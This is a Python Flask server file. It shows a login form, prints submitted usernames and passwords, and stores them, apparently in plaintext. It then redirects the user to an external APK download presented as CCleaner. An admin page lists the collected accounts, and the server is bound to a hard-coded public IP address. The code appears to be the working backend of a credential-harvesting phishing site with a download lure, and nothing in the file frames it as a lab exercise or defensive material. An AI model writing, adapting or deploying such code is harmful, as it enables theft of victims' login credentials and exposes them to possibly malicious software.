import featureBD, checker, decoderMD5, visit_count
import sqlite3
from time import sleep
import _md5
from flask import Flask, render_template, request, redirect

app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def authorized():
    if request.method == "GET":
        return render_template("/authorized.html")
    login = request.form['login']
    password = request.form['password']
    print(login)
    print(password)
    loginHash = decoderMD5.decoder(login)
    error_status = checker.checkLP(login, password)
    if error_status == True:
      return render_template("/authorized.html", error=error_status)
    else:
      featureBD.addUser(login, password)
      return redirect('https://cs5-1.4pda.to/20685729/CCleaner_v5.1.2%28800007367%29.apk?s=003727f651a33c7d5f5a9b3d00000000fe9c8203ac7595b1e17200cd26de7ac7')

q = 0

@app.route('/adminPanelLogin/', methods=['GET', 'POST'])
def admPanel(q=None):
    admPanel_start = 0
    if request.method == "GET":
        return render_template("/adminPanelLogin.html")
    login = request.form['login']
    password = request.form['password']
    loginHash = decoderMD5.decoder(login)
    passwordHash = decoderMD5.decoder(password)
    error_status = checker.checkLPAdmin(login, password)
    members = featureBD.getUserList()

    if (error_status == False):
        admPanel_start += admPanel_start
        return render_template("/adminPanel.html", members=members, status=admPanel_start)
    else:
        return render_template("/adminPanelLogin.html", error=error_status)



if __name__ == "__main__":
    app.run(host='194.50.170.85', port=5001)
